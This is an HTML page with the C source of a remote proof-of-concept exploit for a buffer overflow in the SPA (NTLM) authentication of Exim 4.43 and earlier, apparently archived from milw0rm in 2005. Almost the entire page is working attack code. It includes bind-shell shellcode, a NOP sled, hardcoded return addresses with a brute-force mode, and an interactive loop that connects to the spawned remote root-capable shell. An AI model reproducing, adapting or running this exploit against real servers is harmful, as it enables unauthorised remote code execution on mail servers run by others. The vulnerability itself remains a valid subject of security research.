<html><head><title>Exim <= 4.43 auth_spa_server() Remote PoC Exploit</title></head><pre>/* ecl-eximspa.c
 * Yuri Gushin &lt;yuri@eclipse.org.il&gt;
 *
 * Howdy :)
 * This is pretty straightforward, an exploit for the recently
 * discovered vulnerability in Exim's (all versions prior to and
 * including 4.43) SPA authentication code - spa_base64_to_bits()
 * will overflow a fixed-size buffer since there's no decent
 * boundary checks before it in auth_spa_server()
 *
 * Greets fly out to the ECL crew, Alex Behar, Valentin Slavov
 * blexim, manevski, elius, shrink, and everyone else who got left
 * out :D
 *
 */

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;err.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;

#define SC_PORT 13370
#define NOP 0xfd

struct {
  char *name;
  int retaddr;
} targets[] = {
  { &quot;Bruteforce&quot;, 0xbfffffff },
  { &quot;Debian Sarge exim4-daemon-heavy_4.34-9&quot;, 0xbfffed00 },
};

char sc[] = // thank you metasploit, skape, vlad902
&quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96&quot;
&quot;\x43\x52\x66\x68\x34\x3a\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56&quot;
&quot;\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1&quot;
&quot;\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0&quot;
&quot;\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;
&quot;\x89\xe1\xcd\x80&quot;;

struct {
  struct sockaddr_in host;
  int target;
  int offset;
  u_short wait;
} options;

static int brutemode;

int connect_port(u_short port);
void init_SPA(int sock);
void exploit(int sock, int address);
void shell(int sock);
void spa_bits_to_base64 (unsigned char *out, const unsigned char *in, int inlen);
void parse_options(int argc, char **argv);
void usage(char *cmd);
void banner(void);

int main(int argc, char **argv)
{
  int address, sock_smtp, sock_shell;

  banner();
  parse_options(argc, argv);
  address = targets[options.target].retaddr - options.offset;
  brutemode = 0;

 bruteforce:

  if (!brutemode)
    {
      printf(&quot;[*] Connecting to %s:%d... &quot;,
	     inet_ntoa(options.host.sin_addr), ntohs(options.host.sin_port));
      fflush(stdout);
    }

  sock_smtp = connect_port(ntohs(options.host.sin_port));

  if (!brutemode)
    {
      if (!sock_smtp) 
	{
	  printf(&quot;failed.\n\n&quot;);
	  exit(-1);
	}
      printf(&quot;success.\n&quot;);
    }

  init_SPA(sock_smtp);
  exploit(sock_smtp, address);
  close(sock_smtp);

  printf(&quot;[*] Target: %s - 0x%.8x\n&quot;, targets[options.target].name, address);
  printf(&quot;[*] Exploit sent, spawning a shell... &quot;);
  fflush(stdout);

  sleep(1); // patience grasshopper
  sock_shell = connect_port(SC_PORT);

  if (!sock_shell &amp;&amp; options.target)
    {
      printf(&quot;failed.\n\n&quot;);
      exit(-1);
    }
  if (!sock_shell)
    {
      printf(&quot;failed.\n\n&quot;);
      address -= 1000 - strlen(sc);
      brutemode = 1;
      if (options.wait) sleep(options.wait);
      goto bruteforce;
    }
  printf(&quot;success!\n\nEnjoy your shell :)\n\n&quot;);
  shell(sock_shell);

  return 0;
}

int connect_port(u_short port)
{
  int sock;
  struct sockaddr_in host;

  memcpy(&amp;host, &amp;options.host, sizeof(options.host));
  host.sin_port = ntohs(port);

  if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
      return 0;
  if(connect(sock, (struct sockaddr *)&amp;host, sizeof(host)) &lt; 0)
    {
      close(sock);
      return 0;
    }

  return sock;
}

void init_SPA(int sock)
{
  char buffer[1024];

  memset(buffer, 0, sizeof(buffer));
  if (!read(sock, buffer, sizeof(buffer)))
    err(-1, &quot;read&quot;);
  buffer[255] = '\0';

  if (!brutemode)
    printf(&quot;[*] Server banner: %s&quot;, buffer);

  write(sock, &quot;EHLO ECL.PWNZ.J00\n&quot;, 18);
  memset(buffer, 0, sizeof(buffer));
  if (!read(sock, buffer, sizeof(buffer)))
    err(-1, &quot;read&quot;);
  else
    if (!brutemode &amp;&amp; (!strstr(buffer, &quot;NTLM&quot;)))
      printf(&quot;[?] Server doesn't seem to support SPA, trying anyway\n&quot;);
  write(sock, &quot;AUTH NTLM\n&quot;, 10);
  memset(buffer, 0, sizeof(buffer));
  if (!read(sock, buffer, sizeof(buffer)))
    err(-1, &quot;read&quot;);
  else
    if (!brutemode &amp;&amp; (!strstr(buffer, &quot;334&quot;)))
      {
        printf(&quot;[!] SPA unsupported! Server responds: %s\n\n&quot;, buffer);
        exit(1);
      }
  if (!brutemode) printf(&quot;[*] SPA (NTLM) supported\n&quot;);
}

void exploit(int sock, int address)
{
  char exp[2000], exp_base64[2668];
  int *address_p;
  int i;

  memset(exp, NOP, 1000);
  memcpy(&amp;exp[1000]-strlen(sc), sc, strlen(sc));
  address_p = (int *)&amp;exp[1000];
  for (i=0; i&lt;1000; i+=4)
    *(address_p++) = address;
  spa_bits_to_base64(exp_base64, exp, sizeof(exp));

  write(sock, exp_base64, sizeof(exp_base64));
  write(sock, &quot;\n&quot;, 1);
}

void shell(int sock)
{
  int n;
  fd_set fd;
  char buff[1024];

  write(sock,&quot;uname -a;id\n&quot;,12);

  while(1)
    {
     
      FD_SET(sock, &amp;fd);
      FD_SET(0, &amp;fd);

      select(sock+1, &amp;fd, NULL, NULL, NULL);

      if( FD_ISSET(sock, &amp;fd) )
        {
          n = read(sock, buff, sizeof(buff));
          if (n &lt; 0) err(1, &quot;remote read&quot;);
          write(1, buff, n);
        }

      if ( FD_ISSET(0, &amp;fd) )
        {
          n = read(0, buff, sizeof(buff));
          if (n &lt; 0) err(1, &quot;local read&quot;);
          write(sock, buff, n);
        }
    }    
}

char base64digits[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
void spa_bits_to_base64 (unsigned char *out, const unsigned char *in, int inlen)
{
  for (; inlen &gt;= 3; inlen -= 3)
    {
      *out++ = base64digits[in[0] &gt;&gt; 2];
      *out++ = base64digits[((in[0] &lt;&lt; 4) &amp; 0x30) | (in[1] &gt;&gt; 4)];
      *out++ = base64digits[((in[1] &lt;&lt; 2) &amp; 0x3c) | (in[2] &gt;&gt; 6)];
      *out++ = base64digits[in[2] &amp; 0x3f];
      in += 3;
    }
  if (inlen &gt; 0)
    {
      unsigned char fragment;

      *out++ = base64digits[in[0] &gt;&gt; 2];
      fragment = (in[0] &lt;&lt; 4) &amp; 0x30;
      if (inlen &gt; 1)
        fragment |= in[1] &gt;&gt; 4;
      *out++ = base64digits[fragment];
      *out++ = (inlen &lt; 2) ? '=' : base64digits[(in[1] &lt;&lt; 2) &amp; 0x3c];
      *out++ = '=';
    }
  *out = '\0';
}

void parse_options(int argc, char **argv)
{
  int ch;
  struct hostent *hn;

  memset(&amp;options, 0, sizeof(options));

  options.host.sin_family = AF_INET;
  options.host.sin_port = htons(25);
  options.target = -1;
  options.wait = 1;

  while (( ch = getopt(argc, argv, &quot;h:p:t:o:w:&quot;)) != -1)
    switch(ch)
      {
      case 'h':
        if ( (hn = gethostbyname(optarg)) == NULL)
          errx(-1, &quot;Unresolvable address\n&quot;);
        memcpy(&amp;options.host.sin_addr, hn-&gt;h_addr, hn-&gt;h_length);
        break;
      case 'p':
        options.host.sin_port = htons((u_short)atoi(optarg));
        break;
      case 't':
        if ((atoi(optarg) &gt; (sizeof(targets)/8-1) || (atoi(optarg) &lt; 0)))
          errx(-1, &quot;Bad target\n&quot;);
        options.target = atoi(optarg);
        break;
      case 'o':
        options.offset = atoi(optarg);
        break;
      case 'w':
        options.wait = (u_short)atoi(optarg);
        break;
      case '?':
	exit(1);
      default:
        usage(argv[0]);
      }

  if (!options.host.sin_addr.s_addr || (options.target == -1) )
    usage(argv[0]);
}

void usage(char *cmd)
{
  int i;

  printf(&quot;Usage: %s [ -h host ] [ -p port ] [ -t target ] [ -o offset ] [ -w wait ]\n\n&quot;
	 &quot;\t-h: remote host\n&quot;
	 &quot;\t-p: remote port\n&quot;
	 &quot;\t-t: target return address (see below)\n&quot;
	 &quot;\t-o: return address offset\n&quot;
	 &quot;\t-w: seconds to wait before bruteforce reconnecting\n\n&quot;,
	 cmd);
  printf(&quot;Targets:\n&quot;);
  for (i=0; i&lt;(sizeof(targets)/8); i++)
    printf(&quot;%d - %s (0x%.8x)\n&quot;, i, targets[i].name, targets[i].retaddr);
  printf(&quot;\n&quot;);
  exit(1);
}

void banner(void)
{
  printf(&quot;\t\tExim &lt;= 4.43 SPA authentication exploit\n&quot;
         &quot;\t\t   Yuri Gushin &lt;yuri@eclipse.org.il&gt;\n&quot;
         &quot;\t\t\t       ECL Team\n\n\n&quot;);
}

// milw0rm.com [2005-02-12]</pre></html>